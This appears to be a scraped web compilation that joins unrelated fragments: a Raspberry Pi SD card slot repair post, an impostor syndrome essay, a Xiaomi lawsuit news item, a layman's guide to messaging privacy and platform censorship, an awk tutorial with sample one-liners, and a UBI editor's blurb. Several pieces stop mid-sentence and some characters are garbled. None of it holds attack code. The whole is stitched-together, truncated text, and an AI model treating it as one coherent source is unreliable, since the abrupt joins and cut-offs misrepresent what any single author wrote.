<p>As can be seen on this image the slots have crumbled meaning they no longer hold an SD card. I managed to source the original SD card slots although the seller wanted £2 each for them which just wasn’t worthwhile. I managed to source upgraded metal SD card slots for £0.14p each on aliexpress here: <a href="https://www.aliexpress.com/item/33012711993.html" target="_blank" rel="noreferrer noopener">https://www.aliexpress.com/item/33012711993.html</a></p>



<div><p>Removing the old SD card slot was easy, using a pair of snips I cut as much of the plastic away as possible leaving only the pins to remove. I did this using a soldering iron rather than hot air. </p><p>Installing the new SD card slot was equally as easy, the new slots don’t have the SD card detection switch built in meaning that the detection pads need to be bridged with Solder as can be seen in the image below:</p></div>

<p>Overall this was a very easy repair, I will post some detailed guides or maybe even videos on the repairs once I get through some of the backlog so don’t worry if this repair wasn’t in-depth enough for you. </p>



<h2>Conclusion</h2>



<div><p>This SD card slots arriving from China allows me to repair a further 30 of the damaged Raspberry Pi’s which will be for sale soon – Remember that the profits from these sales goes to the Raspberry Pi Foundation. </p><p>The pace will be slowing down a little once this batch of repairs are complete as I have some upcoming hardware reviews I need to prepare for which will be showcased in future posts. </p></div>



<p>As always please leave a comment and share your thoughts on the repair process. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Introduction</h2><p>What is impostor syndrome? It's when you doubt your skills, value, or accomplishments to the point where you feel like you don't belong (see <a href="https://en.wikipedia.org/wiki/Impostor_syndrome" target="_blank" rel="noopener noreferrer">Wikipedia</a> for more). This blog post focuses on impostor syndrome specifically in software engineering.</p><p>How do you overcome it? Easy: change your thoughts. ðŸ™ƒ</p><p>As you read, try not to push back against each and every point by identifying how it won't work for you, even if your situation truly is different somehow. The goal is to realize that you <em>do</em> provide value and that you <em>have</em> accomplished things.</p><p>I've split this into two sections:</p><ul><li>Thought experiments: these are to provide a different point of view; see if any resonate with you.</li><li>Techniques: these are specific actions that you can try.</li></ul><h2>Thought experiments</h2><h3>Apples to apples</h3><p>If you're a junior developer, comparing yourself against a senior developer is outright unfair. They may have more years in the industry, more experience with the technologies you use, etc. You may think I'm about to say "compare yourself against other junior developers", but that's still comparing apples to oranges in a way. The only person you should be comparing yourself against is the old you. That's the only person who had the exact same circumstances that you had.</p><p>Ask yourself: "am I more effective now than I was a week ago? A month ago? A year ago?" For me, at any given point in the last ~15 <em>years</em>, when I would look back at code from â‰¥1 year prior, I would almost always think of how much better I could do if I were to rework it. <em>That means that I learned!</em> That should be the focal point in your mind.</p><h3>Focus on your strengths</h3><p>The reason this blog post is targeted at software engineers is because the field is <em>huge</em>. It encompasses design, communication, planning, organization, delegation, coding, etc. You can be differing degrees of good at any subset of those areas.</p><p>Don't judge a fish by its ability to climb a tree. If you're great at refactoring systems but bad at justifying your designs during a meeting, you shouldn't focus on the weakness while forgetting about the strength entirely.</p><h3>"Onboarding impostor syndrome"</h3><p>"Onboarding impostor syndrome" is what I'm calling the specific flavor of impostor syndrome that hits when you're new to a job. You feel like you're being flooded with terms, technologies, and processes, and it's hard to feel confident when you feel like you don't have ground to stand on.</p><p>While you shouldn't expect to be operating at 100% in your first days/weeks/months on the job, you still shouldn't feel like an impostor. Just like with learning a musical instrument, improper fundamentals could lead to months or years of undoing those patterns. This means that if you <em>do</em> feel like an impostor, be careful that you're not just relying on time to overcome it. I.e. explore, ask questions, make mistakes, and set aside time for learning.</p><h3>Reverse impostor syndrome</h3><p>Other people may not even be aware that you feel like an impostor. Maybe they think you're doing a great job. Let's consider the opposite scenario: picture someone you know or work with that you think is doing well. <em>You</em> may be unknowingly instilling impostor syndrome in them. For that to even be possible, it must mean that you're doing better than you thought!</p><p>This "reverse impostor syndrome" is the biggest food for thought that I have in this section since it takes some time to unravel. For one, you'll probably never actually know who feels like an impostor, let alone whether <em>you're</em> the cause. But even stepping back to think that it's <em>possible</em> might help change your perspective.</p><h3>Ambiguity</h3><p>As you become more senior in your career, you'll have to deal with more ambiguity. It can take "small" forms like "what priority should this task be?" or larger ones like "how do we get this service up and running in the next year?" It's easy to feel like an impostor when you encounter these ambiguous problems and realize that you don't have an immediate answer for them.</p><p>Imagine if you could quantify ambiguity, e.g. before writing this post, I was at a 17 for what I wanted to say, but now that I'm almost done, I'm at about a 4. You'd be able to compare yourself <em>exactly</em> with everyone else at your job. However, we can't quantify ambiguity. For all you know, you could have the clearest picture in your mind compared to everyone around you. Impostors have a tendency to assume the oppositeâ€”that their ambiguity rating is triple what everyone else's is.</p><p>Ambiguity, by nature of <em>not</em> being concrete, cannot be dealt with directly. First, you have to make it concrete, then you can deal with it. The way one concretizes ambiguity is what's important. Talk to your co-workers about what paths they envision and try to see how they make these decisions. You may find out that your ambiguity rating isn't all that different from them.</p><h3>COVID/isolation</h3><p>(I'll make this point quickly since this will hopefully be irrelevant by 2022)</p><p>Working during isolation is not easy on people for tons of reasons, so if you can only trace your impostor syndrome to 2020/2021, then perhaps it's mostly due to isolation.</p><h3>Success is more visible than failure</h3><p>People don't tend to advertise how long something took or what their struggles were. Instead, you just see a design document or pull request that they produced and you think, "I couldn't have done that". Remember that they're just solving problems the same way that you would be solving them, and they're doing so incrementally.</p><h3>Incorrect severity</h3><p>Suppose you were to list all of your problems out to a co-worker. They might agree that some or even most of what you said are actually problems, but probably not that they're the same severity that you see them as. It's easy when you feel like an impostor to blow things out of proportion without realizing it. I think it's a defense mechanism: if the problems seem too large, then of course you couldn't be expected to solve them all! But now that you can't solve them all, you feel like you don't belong here anymoreâ€”that you're an impostor.</p><p>Try to identify which problems are "real". It's just like having to choose your battles in a friendship/relationship. Maybe writing tests takes you twice as long as everyone else on your team. Is it your biggest problem? If so, talk to your team about it. If not, try to figure out what the "real" problem is. Don't let the little issues pile up and add to your impostor syndrome.</p><h2>Techniques</h2><h3>Journal</h3><p>Journal what you're proud of. Impostor syndrome stems from an inability to internalize your own accomplishments.
If you feel like your accomplishments aren't tangible, then focus on what you've learned. Aim to write 1-3 things per day, even if they're small.</p><p>Here are some minor things that I've been proud of:</p><ul><li>I asked a question before something got out of control</li><li>I identified a potential solution to a problem</li><li>I spoke up when I felt that I should</li></ul><p>The other benefit of the journal is that it serves as a reminder when we tend to get negative. Do you remember your accomplishments from two years ago? Even when I stop to think about it, it's tough to think of which specific things I worked on or which problems I solved. With my journal, I can look back at those things to remind myself that I'm <em>not</em> an impostor.</p><h3>Mentoring</h3><p>This tip works two ways!</p><ul><li>Find a mentor: a mentor should be someone who is willing to help you. You can tell them that you're struggling with impostor syndrome, and they can help guide you through the process of overcoming it. During that time, they can potentially teach you about a wide range of things or share their own experiences.</li><li>Find a mentee: by teaching someone else, it'll help you realize that you have value to offer. It means that you've made enough progress that someone wants to learn what you have to teach.</li></ul><h3>Talk to your co-workers!</h3><p>I mentioned earlier that you shouldn't compare yourself with your co-workers, and I still assert that. However, they <em>are</em> the closest to your situation both in terms of circumstances and responsibility. Talking to them about the issues you're facing with the intent to find solutions can potentially put a dent in your negative thinking.</p><p>Here's a more specific technique that's helped me: write down <em>every</em> question you have. "What does this function do?" "How did you come up with that design decision?" "Why are we using this technology?" In asking them, you'll get one of two benefits:</p><ul><li>The answer (or redirection to someone/something that has the answer), in which case you're building more and more reasons why you're not an impostor, since now you know something more!</li><li>A realization that they don't know these things either, in which case you can ask them how they would cope with that (maybe it's not important, maybe it's more difficult than you thought, etc.).</li></ul><h3>Share your accomplishments</h3><p>This is similar to journaling in that you first need to recognize what your accomplishments are, but then keep it in mind the next time a friend asks you how you're doing. I find that small communities are great for sharing accomplishments, e.g. a small subreddit or Discord server. The people there will likely care about what you've done, encourage you, ask questions, etc.</p><h3>Identify what's worked</h3><p>Everyone is different, so you need to find out what's worked for you and then remember it.</p><p>Your impostor syndrome likely wavers a bit such that you have highs and lows:</p><ul><li>During a high, try to identify what might have caused it. Were you coding up a storm? Journaling? Exercising? Sleeping well? <strong>Write it down</strong>.</li><li>During a low, consult your notes and see what you can do to rebuild those circumstances.</li></ul><h2>Conclusion</h2><p>Impostor syndrome is insidious. It takes away from your sense of satisfaction and pride while raising your stress level. I wrote this post as much for others as I did for myself; I experienced impostor syndrome just <em>last week</em>, and I'm well into my career!</p><p>Please take some time to reflect on what you've read. If you feel empowered to work on your own impostor syndrome, then I urge you to pair action to impulse and commit to it in some way: make …</p></div></div>

<![CDATA[Xiaomi to Prosecute US Government over Treasury Ban]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://relayvibes.co/tag/xiaomi">Xiaomi</a> has taken a step further to prosecute the US government on the investment ban which resists Americans from investing in the Chinese smartphone maker.</p>
<p>The U.S. Defense and Treasury Departments, is making move to take out the Xiaomi from a list of companies having affiliation with China’s military.</p>
<p>Early in the January, former US President, Donald Trump, had included the company on the Pentagon blacklist which prevents Americans from investing in the tech company. Trump had accused Xiaomi that it has strong ties with the Chinese military. This allegation was later denied. Xiaomi had tried to convince that it is not a “Communist Chinese Military Company”.</p>
<p>Now, in spite of the fact that Trump has been relieved of his office as the president, the investment ban still continues.</p>
<p>According to <a href="https://www.reuters.com/article/us-xiaomi-complaint/chinas-xiaomi-files-legal-complaint-against-u-s-defense-treasury-ban-idUSKBN29Z01A" target="_blank" rel="noopener">Reuter</a>, in the complaint, which was addressed to the new Defense Secretary, Lloyd Austin, and the Treasury Secretary, Janet Yellen, Xiaomi has expressed their grief by calling the judgment “unlawful and unconstitutional” and stressed that the company was not being controlled by the China army.</p>
<p>Challenging the ban, Xiaomi has taken the step to sue the US government. An application has now been in the bid to reverse the ban order.</p>
<p>Xiaomi had stressed, in their court filling, should the ban continues the company will face “imminent, severe, and irreparable harm”.</p>
<p>The court filing read:<br>
<em>“This action has challenges the Trump Administration’s unlawful designation on January 14, 2021, of Plaintiff Xiaomi, a consumer electronics company, as a Communist Chinese military company (“CCMC”) subject to Executive Order 13959. As a result of that designation, U.S. persons will no longer be able to purchase publicly traded Xiaomi securities or derivatives of those securities as of March 15, 2021, and must divest their holdings by January 14, 2022. As explained below, the designation of Xiaomi as a CCMC (the “Designation”) is unlawful and should be enjoined. By failing to provide a reasoned explanation for the Designation, and by making a designation decision that necessarily runs counter to any accurate evidence before the agencies, the Departments of Defense and Treasury engaged in arbitrary and capricious decision making, in violation of the Administrative Procedure Act (“APA”),”&nbsp;</em></p>
<p><em>“As relevant here, the Order prohibits transactions by any U.S. persons in publicly traded securities of certain companies that the Department of Defense, in consultation with the Department of the Treasury, designates as a “Communist Chinese military company.” President Trump amended Executive Order 13959 on January 13, 2021. Exec. Order No. 13974, 86 Fed. Reg. 4875 (Jan. 13, 2021) (attached as Ex. B). As amended, the Order provides that the prohibitions on transactions of CCMC securities or derivatives of those securities by U.S. persons take effect 60 days after a company is designated,”</em></p>
<p>Xiaomi had earlier disclosed that it been complying with US law and made a confirmation that it’s not owned, controlled or in affiliation with the Chinese military.</p>
<p>More than 70% of the Xiaomi’s voting rights, were held by the co-founders, Lin Bin and Lei Jun, and not owned or controlled by any individual or entity associated with the military.</p>

      <p>There has been rising concern over the past number of years around security in personal communications. More recently, with censorship on social media platforms occurring on a grand scale, people are wondering about securing social media platforms. I wouldn't call myself an expert on either topic, but I have good knowledge of the underlying technologies and principles, and have done some investigative work into the specific platforms for work. With many friends and family suddenly interested in this topic, I figured I would write up a layman's guide.</p>
<p>One word of caveat, since everything is politically charged today. I definitely have my own political views, and I mostly elect to keep them separate from my discussions of technology. I'm going to do so here as well. I'm not endorsing or objecting to any recent actions or desires of people to communicate in certain ways. If I ever decided to publicly share my political views, I would do that separately. For now, I'm simply going through the technological implications.</p>
<p><strong>UPDATE</strong> I decided to make a video version of this information as well for those who prefer getting the content in that format. You can check it out <a href="https://www.youtube.com/watch?v=RT69LwB2Pyk">on YouTube</a> or <a href="https://www.bitchute.com/video/zuT7MMGdEX7c/">on BitChute</a>.</p>
<h2 id="executive-summary">Executive summary</h2>
<p>I know there are a lot of details below, but I strongly encourage people to read through it, or at least skim, to understand my recommendations here. But for the busy (or lazy), here are my recommendations:</p>
<ul>
<li>Private communication:
<ul>
<li>Use <a href="https://www.signal.org/">Signal</a>, <a href="https://wire.com/en/">Wire</a>, or <a href="https://matrix.org/">Matrix</a></li>
<li>Be careful about what you say in a group chat</li>
<li>Assume anything you say will last forever</li>
<li>If you want semi-secure email, use <a href="https://protonmail.com/">ProtonMail</a>, but don't rely on it</li>
</ul>
</li>
<li>Social media
<ul>
<li>Your best bet for censorship freedom: host the content yourself, but that's hard, and you have to find a place to host it</li>
<li>When you use <em>any</em> platform, you're at their mercy regarding censorship</li>
<li>Each platform is pretty upfront at this point about what you're getting. Facebook and Twitter will remove some voices, Gab and Parler claim they won't</li>
</ul>
</li>
<li>General security
<ul>
<li>Use a password manager!!!</li>
<li>Don't install random executables and extensions</li>
<li>Don't trust messages from people, confirm who they are, check URLs</li>
</ul>
</li>
</ul>
<p>OK, with that out of the way: the analysis.</p>
<h2 id="security-doesn-t-mean-anything">Security doesn't mean anything</h2>
<p>This is the first major point to get across. People often use the term "security" for lots of different things. In a vacuum, the term doesn't mean much. That's because security only applies in the presence of a specific kind of attack, and we haven't defined that attack. It could be a Denial of Service attack, where someone tries to prevent the service from working. It could be a physical attack, like stealing your phone.</p>
<p>What I hear people concerned about right now are two kinds of attacks. They think they're related, but in reality they are not. Let me explain those attacks:</p>
<ul>
<li>I'm worried that my private communications are being read by Big Tech or the government</li>
<li>I'm worried that my social media posts are going to be censored by Big Tech</li>
</ul>
<p>Notice that, in many ways, these are <em>opposite</em> concerns. The former is about ensuring you can say something without anyone else knowing it. The latter is about ensuring you can say something loudly without anyone stopping it. The two different threats necessitate two different analyses, which I'll provide below.</p>
<p>Also, let me address a threat I'm <em>not</em> addressing, since it's an inherent contradiction. You can't worry about privacy on social media, not in the "blast to the world" public concept it's typically used in. If you want something to be private, don't put it on social media. This may seem obvious, but many people seem to want to have their cake and eat it too. If you post on social media, you can always be held accountable for what you've said there. If you want privacy, use private communications.</p>

<p>Metadata is a term like "algorithm" which has a real meaning, but is (ab)used in the media so much to make it seem like scary, unknowable information. It's not. Metadata is just "data about data." Let's take a simple private communication example. My doctor wants to send me a message about my test results. Most people, and most governments in fact, recognize a right to privacy for this, and enforce this through law (e.g., HIPAA).</p>
<p>In this example, the "data" would be the results themselves: what test I took, who administered the test, when I took the test, and the results. The metadata would be information about sending the message: who the sender is, who the receiver is, the size of the message, the timestamp of when it was sent, etc.</p>
<p>Many messaging protocols try to ensure two things:</p>
<ul>
<li>The data is completely private to only the participants of the conversation</li>
<li>The metadata has as little useful information in it as possible</li>
</ul>
<p>The reason is that, often times, metadata can be read by intervening services. In our test result example, it would be best to assume that a nefarious party will be able to find out that my doctor sent me <em>some message</em> at 4:32pm on Tuesday, and that it was 5mb in size. Most messaging systems try to hide even that, but you don't usually get the same guarantees as with the underlying data.</p>
<p>And that brings us to the first important point.</p>
<h2 id="email-is-busted">Email is busted</h2>
<p>Don't use email for private communications, full stop. It's an antiquated, poorly designed system. There are a lot of tools out there to try to secure email, but they are all as holey (not holy) as swiss cheese. The primary issue: most of them have no ability to secure your metadata, and that will often include the subject. Imagine your nefarious character can read:</p>
<blockquote>
<p>From: Dr. Smith <a href="mailto:drsmith@prostatecancer.org">drsmith@prostatecancer.org</a><br>
To: John Doe <a href="mailto:john@doe.com">john@doe.com</a><br>
Subject: Test results, not looking good</p>
</blockquote>
<p>Sure, the rest of the message is secure, but does it matter?</p>
<p>Email is a necessary evil. Many services require it as some kind of identity provider. You'll have to use it. But don't consider anything you put in email safe.</p>
<p>With major providers like Gmail and Outlook, you can safely assume that the companies are spying on everything you're saying. I use both, and assume nothing that goes on there is truly private. If you want to harden your email usage a bit, <a href="https://protonmail.com/">ProtonMail</a> is a good choice.</p>
<h2 id="messaging-apps">Messaging apps</h2>
<p>Perhaps surprisingly, your best bet for privately communicating with others is messaging apps. These include options like WhatsApp, Telegram, and Signal, and I'll get into the trade-offs. As with most things in security, there's a major trade-off between <em>security</em> and <em>convenience</em>. Since I'm writing this for a general purpose audience, I'm not going to go into the intricacies of things like secure key transfer, since I don't think most people will have the stomach for what's involved here. Suffice it to say: these options are, in my opinion, the best options that I think most people will be comfortable using. And they're secure enough for me to use, as you'll see.</p>
<h3 id="encryption">Encryption</h3>
<p>The primary question for messaging apps is <em>encryption</em>, and specifically <em>public key cryptography</em>. With public key cryptography, I can send you a message that only you can read, and you can verify that I'm in fact the one who sent it. Done correctly, public key cryptography prevents many kinds of attacks.</p>
<p>But there's a twist here. Let's say Alice and Bob are trying to talk to each other using a messaging app called SecureTalk. Alice uses the SecureTalk app on her iPhone, and it sends messages to the SecureTalk server, which sends the messages on to Bob's Samsung device. Alice encrypts her message, so only the recipient can read it. The question is: who is the recipient? This may seem obvious (Bob), but it's not. There are two different possibilities here:</p>
<ol>
<li>In something called <em>end-to-end encryption</em>, Alice will encrypt the message so only Bob can read it. She'll send the encrypted message and some metadata to the SecureTalk server. The server will be able to read the metadata, but won't know what the message itself says. Then the SecureTalk server sends the metadata and encrypted message to Bob, who is the only person who can read the message itself.</li>
<li>The simpler approach is that Alice will encrypt the message so that the SecureTalk server can read it. This prevents random other people on the internet from reading the message, but doesn't prevent SecureTalk from reading the message. SecureTalk then reencrypts the message for Bob and sends it to him.</li>
</ol>
<p>You may think that (1) actually sounds simpler than (2), but for various technical reasons it isn't. And therefore, a lot of systems out there still do not provide end-to-end encryption. The primary culprit I want to call out here is Telegram. Telegram is viewed as a secure messaging platform. And it <em>does</em> provide end-to-end encryption, but only if you use its "secret chat" feature. But you lose features with it, and most people don't use it most of the time. In other words:</p>
<blockquote>
<p>Telegram is not a good choice for security, despite its reputation to the contrary</p>
</blockquote>
<h3 id="identity">Identity</h3>
<p>How do you identify yourself to the messaging service and your colleagues? Most apps use one of two methods: phone number (verified via SMS) and email address (verified via confirmation email). For the most part, the former is most popular, and is used exclusively by systems like WhatsApp, Telegram, and Signal. This is good from an ease of use standpoint. But there's a major issue to be aware of:</p>
<blockquote>
<p>Your secure chat identity is tied to your phone number, and most countries track ownership of phones</p>
</blockquote>
<p>Maybe you can buy a burner phone without the number being tied to your identity, I'm not sure. I've never needed that level of privacy. But the other system, email address, is easier for creating a more anonymous identity. Most people can easily create a ProtonMail account and have an anonymous experience.</p>
<p>This is outside the bounds of security, …</p></div></div></div></section></div></div>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In this article, I will attempt to convince you that 'awk' is a great tool to learn for solving one-off text manipulation and analysis problems. &nbsp;After learning awk, you'll immediately be accepted into the "10x engineer's club" and be cured of your imposter syndrome. &nbsp;From now on, your typical team meetings will go something like this:</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Manager</strong>: &nbsp;"Hey, let's make a well-informed data-driven decision about which product to focus on selling. &nbsp;Do we have any numbers on which product(s) make the most profit in total?".</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>All 1x Engineers in the room</strong> (<em>speaking together in a synchronized monotone voice</em>): "Nah, we'd have to write an ETL job to import the .csv files and write many Java Classes. &nbsp;It would take at least 4 weeks.".</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>You</strong>: "I just spent 30 seconds writing an awk one-liner to calculate the profit for each product. &nbsp;Here is the list sorted from highest to lowest."</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Manager</strong>: "Thanks. I value your expertise, and have a great appreciation for your contributions to this company."</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Awk is a command-line tool that can be used for processing text files line by line. &nbsp;The 'awk' command could be compared to the 'grep' or 'sed' commands. &nbsp;In fact, many of the basic use cases for 'grep' or 'sed' can actually be solved in a nearly identically way by awk. &nbsp;Therefore, an important question worth asking is: &nbsp;If some of the use cases for awk are replicated by 'sed' or 'grep', why would you ever want to use awk? &nbsp;The answer is that awk is a fully-fledged programming language. &nbsp;The 'grep' command is specifically designed for searching, and the 'sed' command is specifically designed for replacing. &nbsp;Awk is able to do both at the same time, but even more importantly, 'awk' gives you access to things that a 'real' programming language has, like math or logic operations, formatted printing, arrays, etc.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But, you may wonder, if 'awk' acts like a 'real' programming language, why not stick to another established 'real' programming language like Python? &nbsp;The answer is that 'awk' was specifically designed to serve in this middle-ground area of 'sort of command-line' and 'sort of programming language'. &nbsp;It's definitely possible to insert Python into the middle of a shell pipe (with python -c), but it quickly gets pretty messy. &nbsp;Awk, on the other hand, is much better suited for the task, and it includes a <em>lot</em> of default assumptions that make it very terse (but also intimidating to beginners).</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here's a specific example of a problem that 'awk' can solve, but 'grep' or 'sed' can't. &nbsp;The following file 'temps.csv' contains a list of temperature values:</p>

<p><code><pre>temp	unit
26.1	C
78.1	F
23.1	C
25.7	C
76.3	F
77.3	F
24.2	C
79.3	F
27.9	C
75.1	F
25.9	C
79.0	F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Some of these temperature values are stated in Celsius, while other are stated in Fahrenheit. &nbsp;In a case like this, you might want to normalize these values to use the same unit so that you can graph them, or compute an average etc. &nbsp;You can do exactly that with the following 'awk' command:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print ($2=="F" ? ($1-32) / 1.8 : $1)"\tC"}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which gives the following output:</p>

<p><code><pre>temp	unit
26.1	C
25.6111	C
23.1	C
25.7	C
24.6111	C
25.1667	C
24.2	C
26.2778	C
27.9	C
23.9444	C
25.9	C
26.1111	C
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To understand how this awk command works, let's work on re-building it from scratch. &nbsp;Here is a much simpler awk command that shows how it will automatically parse and split up the two columns for us so we can work with them separately:</p>

<p><code><pre>awk <span>'</span><span>{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which gives the following output:</p>

<p><code><pre>First column item: temp Second column item: unit
First column item: 26.1 Second column item: C
First column item: 78.1 Second column item: F
First column item: 23.1 Second column item: C
First column item: 25.7 Second column item: C
First column item: 76.3 Second column item: F
First column item: 77.3 Second column item: F
First column item: 24.2 Second column item: C
First column item: 79.3 Second column item: F
First column item: 27.9 Second column item: C
First column item: 75.1 Second column item: F
First column item: 25.9 Second column item: C
First column item: 79.0 Second column item: F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Since the columns in the original file are separated by white-space, the awk command will automatically split up the 'columns' and make them accessible inside the '$1' and '$2' variables. &nbsp;As you can see, our last example simply prints these out without doing any kind of logic on them. &nbsp;This stuff inside the {...} characters is called the 'action' statement.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;By default (on my machine), awk will attempt to run every single 'action' statement on every line of the file. &nbsp;In our case, we don't actually want our special print statement to run on every line of the file. &nbsp;In particular, we don't want to make changes to the first line, since it's just the list of column headers. &nbsp;We can add the requirement that our special print statement should only occur on 'record number greater than 1', or 'NR&gt;1'. &nbsp;'NR' stands for Number of Record:</p>

<p><code><pre>awk <span>'</span><span>NR&gt;1{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But this won't print out the header <em>at all</em>. &nbsp;To print out the first line without changing it, we can add the statement 'NR==1;' to our awk command. &nbsp;The 'NR==1' part means "Only do this on the record #1", and the ';' part is an empty statement which defaults to printing out the current line without changing it:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print "First column item: " $1 " Second column item: " $2 }</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here is the output from this command:</p>

<p><code><pre>temp unit
First column item: 26.1 Second column item: C
First column item: 78.1 Second column item: F
First column item: 23.1 Second column item: C
First column item: 25.7 Second column item: C
First column item: 76.3 Second column item: F
First column item: 77.3 Second column item: F
First column item: 24.2 Second column item: C
First column item: 79.3 Second column item: F
First column item: 27.9 Second column item: C
First column item: 75.1 Second column item: F
First column item: 25.9 Second column item: C
First column item: 79.0 Second column item: F
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And now we're almost back at the full command that we started off with. &nbsp;We just need to add the temperature normalizing part. &nbsp;The logic/math for normalizing to Celsius units would look something like this:</p>

<p><code><pre>if<span>(</span><span>$2</span><span>==</span><span>"</span><span>F</span><span>"</span><span>)</span><span>{</span>
  <span>print</span><span> </span><span>(</span><span>$1</span>-32<span>)</span> / <span>1</span>.<span>8</span> 
<span>}</span><span>else</span><span>{</span>
  <span>print</span><span> </span><span>$1</span>
<span>}</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or, we could re-write this using the ternary operator as the following:</p>

<p><code><pre><span>print</span><span> </span><span>(</span><span>$2</span><span>==</span><span>"</span><span>F</span><span>"</span><span> ? </span><span>(</span><span>$1</span><span>-32</span><span>)</span><span> / </span><span>1</span><span>.</span><span>8</span><span> : </span><span>$1</span><span>)</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Substituting this back into our print statement gives us the full solution that was introduced previously:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{print ($2=="F" ? ($1-32) / 1.8 : $1)"\tC"}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The final output that was shown before was not very nice to look at since most of the converted Fahrenheit values had way too many digits after the decimal place. &nbsp;To fix this, we can use the more sophisticated 'printf' to do a formatted print operation and make the output look even better:</p>

<p><code><pre>awk <span>'</span><span>NR==1; NR&gt;1{printf("%.1f\t%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;which outputs the following:</p>

<p><code><pre>temp	unit
26.1	C
25.6	C
23.1	C
25.7	C
24.6	C
25.2	C
24.2	C
26.3	C
27.9	C
23.9	C
25.9	C
26.1	C
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In order to split up the columns in each line, awk needs to know what the 'field separator' is. &nbsp;The default field separator can be different on different systems or different implementations of awk, but you can often assume it to be 'white-space' for some definition of white-space. &nbsp;You can also explicitly specify it using the '-F' flag. &nbsp;For example, here is the same awk command we just used, but using a comma for the field separator:</p>

<p><code><pre>awk <span>-F</span><span>'</span><span>,</span><span>'</span> <span>'</span><span>NR==1; NR&gt;1{printf("%.1f,%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and here it is again with an explicitly specified tab character:</p>

<p><code><pre>awk <span>-F</span><span>'</span><span>\t</span><span>'</span> <span>'</span><span>NR==1; NR&gt;1{printf("%.1f\t%c\n",($2=="F" ? ($1-32) / 1.8 : $1),"C")}</span><span>'</span> temps.csv
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Field separators can even be regular expressions:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>col1-481-col2-981-col3</span><span>"</span><span> </span>| awk <span>-F</span><span>'</span><span>-[0-9]{3}-</span><span>'</span> <span>'</span><span>{print $1" "$2" "$3}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outputs the following:</p>

<p><code><pre>col1 col2 col3
</pre></code></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>False.</strong> &nbsp;Awk is extremely <em>easy</em> to learn. &nbsp;The reason that it <em>seems</em> so hard to learn is because awk has so many implicit defaults, but nobody ever seems to explain this fact.</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You can think of every awk command as a collection of 'if statements' that run against every line in the file. &nbsp;The syntax of every awk command looks pretty close to something like this:</p>

<p><code><pre>awk <span>'</span><span>if(PATTERN1){...print something...} if(PATTERN2){...print something...} ...</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with the one exception beging that the 'if' keyword is never actually written out since it's assumed to be there by default (if you do write it, you'll get a syntax error). &nbsp;Therefore, the overall syntax for every awk command (that doesn't rely on defaults) is pretty much this:</p>

<p><code><pre>awk <span>'</span><span>(PATTERN1){...Action 1...} (PATTERN2){...Action 2...} ...</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In the above command, the 'PATTERN1' or 'PATTERN2' is the trigger you want to cause the stuff inside the '{' '}' characters to actually execute. &nbsp;Here are a few examples of commonly used patterns:</p>

<p><code><pre>
<span>echo</span><span> -e </span><span>"</span><span>hello</span><span>\n</span><span>world</span><span>"</span><span> </span>| awk <span>'</span><span>(NR==2){print $0}</span><span>'</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;will output:</p>

<p><code><pre>world

			<p><em>In this piece, author Jessica Flanigan makes the case that UBI is a better solution than raising the minimum wage, because UBI reaches all workers, paid and unpaid, and would also provide all workers the bargaining power to better choose where and how they want to work. — Scott Santens, Editor, BIT</em></p>
